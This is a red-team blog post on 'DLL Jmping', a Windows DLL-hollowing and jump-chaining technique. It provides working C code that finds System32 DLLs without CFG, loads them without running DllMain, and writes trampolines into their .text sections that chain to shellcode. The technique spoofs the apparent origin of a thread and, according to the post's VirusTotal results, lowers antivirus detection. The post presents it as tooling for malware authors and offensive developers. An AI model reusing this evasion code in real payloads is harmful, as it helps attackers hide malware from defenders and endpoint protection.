# https://www.blackhillsinfosec.com/dll-jmping/

[Join us at Wild West Hackin' Fest @ Mile High in Denver for Training, Community, and Fun!](https://wildwesthackinfest.com/wild-west-hackin-fest-mile-high-2026/)

6Jun2024

[Debjeet Banerjee](https://www.blackhillsinfosec.com/category/author/debjeet-banerjee/), [General InfoSec Tips & Tricks](https://www.blackhillsinfosec.com/category/infosec-101/general-infosec-tips-tricks/), [Informational](https://www.blackhillsinfosec.com/category/informational/), [InfoSec 201](https://www.blackhillsinfosec.com/category/infosec-201/), [Red Team](https://www.blackhillsinfosec.com/category/red-team/), [Red Team Tools](https://www.blackhillsinfosec.com/category/red-team/tool-red-team/)

# [DLL Jmping: Old Hollow Trampolines in Windows DLL Land](https://www.blackhillsinfosec.com/dll-jmping/)

![](https://www.blackhillsinfosec.com/wp-content/uploads/2024/06/DBanerjee-1-150x150.png)

\| [Debjeet Banerjee](https://twitter.com/whokilleddb)

![](https://www.blackhillsinfosec.com/wp-content/uploads/2024/06/AD_pt4header-1-1024x576.png)

DLL hollowing is an age-old technique used by malware authors to have a memory-backed shellcode. However, defensive mechanisms like CFG and XFG have made it incredibly difficult to implement such techniques. Controls like WDAC are enabled by default on the latest Windows releases, which adds an extra layer of difficulty when it comes to implementing alternate versions of this technique.

However, Windows still has some DLLs on the system which can be leveraged for DLL Hollowing or, coupled with some JOP, can be used to spoof the origin of threads from tools like Process Hacker. This blog demonstrates how we can dynamically locate such DLLs and use them to deliver payloads. The technique discussed in this blog can help malware authors to dynamically find such DLLs on a target system and use them to masquerade the origin of threads, as well as have memory-backed shellcode to bring down detection rate of payloads.

### **Finding Target DLLs**

To find a list of DLLs, we need a couple of functions:

- A function that iterates through the system directory recursively to find all DLLs present.
- A function that checks if the DLLs can be used to stage payload delivery.

The first part is fairly simple. We use a function to recursively search a directory for all DLLs as such:

```
BOOL ListDLLsInDirectory(LPCTSTR directoryPath) {
    HANDLE hFind;
    WIN32_FIND_DATA findFileData;
    TCHAR searchPath[MAX_PATH];

    if (NULL == directoryPath) return FALSE;

    // Combine directory path with wildcard search pattern
    if (S_OK != StringCchPrintf(searchPath, MAX_PATH, TEXT("%s\\*"), directoryPath)) return FALSE;

    // Find the first file in the directory
    hFind = FindFirstFile(searchPath, &findFileData);
    if (hFind == INVALID_HANDLE_VALUE) return FALSE;

    // List all DLL files
    do {
        if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            // Skip "." and ".." directories
            if (_tcscmp(findFileData.cFileName, TEXT(".")) != 0 && _tcscmp(findFileData.cFileName, TEXT("..")) != 0) {
                // Recursively list DLLs in subdirectory
                TCHAR subDirPath[MAX_PATH];
                if (S_OK != StringCchPrintf(subDirPath, MAX_PATH, TEXT("%s\\%s"), directoryPath, findFileData.cFileName)) {
                    FindClose(hFind);
                    return FALSE;
                }
                ListDLLsInDirectory(subDirPath);
            }
        }
        else {
            // Print the DLL file name
            if (endsWithDll(findFileData.cFileName)) {
                // Check if DLL is valid
                TCHAR dll_path[MAX_PATH] = { 0 };
                if (S_OK != StringCchPrintf(dll_path, MAX_PATH, TEXT("%s\\%s"), directoryPath, findFileData.cFileName)) {
                    FindClose(hFind);
                    return FALSE;
                }

                LPVOID txt_addr = CheckIfDllWorks(dll_path);
                if (txt_addr != NULL) {
                    size_t entry_size = sizeof(DLLInfo);
                    PDLLInfo entry = (PDLLInfo)malloc(entry_size);
                    RtlZeroMemory(entry, entry_size);
                    entry->txt_section = txt_addr;
                    memcpy(entry->dll_path, dll_path, MAX_PATH);

                    // Check if this is the first entry
                    if (LL_HEAD == NULL) LL_HEAD = entry;

                    // Set the last entry's next pointer
                    if (Current != NULL) Current->next = entry;

                    Current = entry;
                }
            }
        }
    } while (FindNextFile(hFind, &findFileData));

    // Close the search handle
    FindClose(hFind);

    return TRUE;
}
```

We can then call the above function like such:

```
TCHAR systemDirectory[MAX_PATH];
GetSystemDirectory(systemDirectory, MAX_PATH);
ListDLLsInDirectory(systemDirectory);
```

The function uses recursion to locate all DLLs in the systems folder, aka \`C:\\Windows\\System32\`. Once we locate a DLL file, we use the \`CheckIfDllWorks\` function to verify if the DLL can be used to deliver payloads (more on this a bit later).

If the DLL can be used for payload delivery, then we add it to a linked list that contains the DLLs to use and the address at the beginning of their \`.text\` section. Looking into the \`CheckIfDllWorks()\` function, it has the following code:

```
LPVOID CheckIfDllWorks(TCHAR* dll_path) {
    if (IsDllLoaded(dll_path)) return NULL;

    HMODULE hModule = LoadLibraryEx(dll_path, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (hModule == NULL) return NULL;

    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)hModule;
    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((DWORD_PTR)hModule + dosHeader->e_lfanew);

    // Check for CFG
    if (ntHeaders->OptionalHeader.DllCharacteristics & IMAGE_DLLCHARACTERISTICS_GUARD_CF) {
        FreeLibrary(hModule);
        return NULL;
    }

    // Iterate through the section headers
    IMAGE_SECTION_HEADER* sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++, sectionHeader++) {
    ULONG _txt_offset = 0;
		if (strncmp((char*)sectionHeader->Name, ".text", 5) == 0) {
			_txt_offset = sectionHeader->VirtualAddress;
			LPVOID txt_section = (LPVOID)((UINT64)hModule + _txt_offset);
			return txt_section;
		}
    }
    FreeLibrary(hModule);
    return NULL;
}
```

The function checks three things:

- Is the DLL already loaded in memory? If not, it moves to the next check
- Was the DLL compiled with CFG enabled? If not, it moves to the final check
- Does the DLL have a \`.text\` section where we can host our code? If so, the function computes the offset of the \`.text\` section and adds it to the base address to get the location of the \`.text\` section loaded in memory

One interesting artifact I would like to mention is that we use the \`LoadLibraryEx()\` function over the \`LoadLibrary()\` function, as that enables us to load a DLL in memory without the need to call \`DllMain()\`

Ultimately, we have a linked list full of DLLs loaded in the process memory which we can use to redirect execution to our shellcode.

### **Jmp’ing to Shellcode**

Now for the payload propagation part, we would write the following instruction at the start of every \`.text\` section:

```
mov rax <addr> ;  48 b8 <lil endian address>
call rax       ;  ff d0
```

![](https://www.blackhillsinfosec.com/wp-content/uploads/2024/06/diagram-1024x230.png)

The code for the process looks as such:

```
BOOL AddJmp(LPVOID jmp_tgt, LPVOID src) {
    size_t inst_size = 12 * sizeof(unsigned char);
    unsigned char* inst = (unsigned char*)malloc(inst_size);
    if (inst == NULL) return FALSE;

    RtlZeroMemory(inst, 12 * sizeof(unsigned char));
    inst[0] = 0x48;
    inst[1] = 0xb8;
    inst[10] = 0xff;
    inst[11] = 0xd0;
    int i = 2;
    uintptr_t bytes = (uintptr_t)(jmp_tgt);
    while (i < 10) {
        inst[i] = bytes & 0xFF;
        bytes = bytes >> 8;
        i++;
    }
    AllocatePayload(src, inst, inst_size);
    return TRUE;
}

LPVOID BackDoorDLL(LPVOID p_addr) {
    PDLLInfo entry = LL_HEAD;
    LPVOID tgt_addr = p_addr;

    while (entry != NULL) {
        if (!AddJmp(tgt_addr, entry->txt_section)) return NULL;
        tgt_addr = entry->txt_section;
        entry = entry->next;
    }
    return tgt_addr;
}
```

The \`BackDoorDLL()\` function takes in the address of the shellcode. We then iterate through the Linked List and use the \`AddJmp()\`  to write the opcode for the instruction to the start of the \`.text\` section of the DLLs. Finally, the \`BackDoorDLL()\` function returns the address of the start of the chain, which we can then pass onto functions like \`CreateThread()\` which will eventually lead to the execution of shellcode.

Alternatively, if the size of the payload is less than the size of a particular DLL’s \`VirtualSize\`, we can use the DLL to even overwrite the DLL memory with the shellcode.

### **Testing the Code**

Compiling and running the project, we should see our \_Hello World\_ MessageBox payload being executed.

![](https://www.blackhillsinfosec.com/wp-content/uploads/2024/06/messagebox.png)

Looking at the thread in Process Hacker, we see that the origin for the thread is being reflected as \`pspluginwkr.dll\` instead of the binary.

![](https://www.blackhillsinfosec.com/wp-content/uploads/2024/06/ph1.png)

![](https://www.blackhillsinfosec.com/wp-content/uploads/2024/06/ph2.png)

Further putting a breakpoint at one of the intermediate addresses confirms that the chain calls are taking place and that it works as expected.

![](https://www.blackhillsinfosec.com/wp-content/uploads/2024/06/vs-1024x551.png)

### **VirusTotal Comparisons**

To check the effectiveness of this method, we upload two sets of payloads:

– One with a direct call to the Shellcode

– One using the above method

The samples used the same unencrypted payload, without any other evasions, and were compiled using the same flags as well.

The sample which directly called the payload returned the following detection rate:

![](https://www.blackhillsinfosec.com/wp-content/uploads/2024/06/direct-1024x163.png)

However, implementing the above method discussed method seems to significantly reduce the detection rates to:

![](https://www.blackhillsinfosec.com/wp-content/uploads/2024/06/chain-1024x163.png)

Therefore, it would be worthwhile to include the method in this blog post in your Offsec tooling.

Combined with other evasion techniques, the chaining method discussed here can help Offsec Devs create more undetectable payloads. Happy Hacking!

* * *

* * *

Ready to learn more?

Level up your skills with affordable classes from Antisyphon!

**[Pay-Forward-What-You-Can Training](https://www.antisyphontraining.com/pay-forward-what-you-can/)**

Available live/virtual and on-demand

![](https://www.blackhillsinfosec.com/wp-content/uploads/2025/04/Antisyphon-Training-Powered-By-BHIS-blk-500x260.jpeg)

* * *

* * *

[Abusing Active Directory Certificate Services (Part 4)](https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-4/)[Augmenting Security Testing and Analysis Activities with Microsoft 365 Products](https://www.blackhillsinfosec.com/augmenting-security-testing-and-analysis-activities-with-microsoft-365-products/)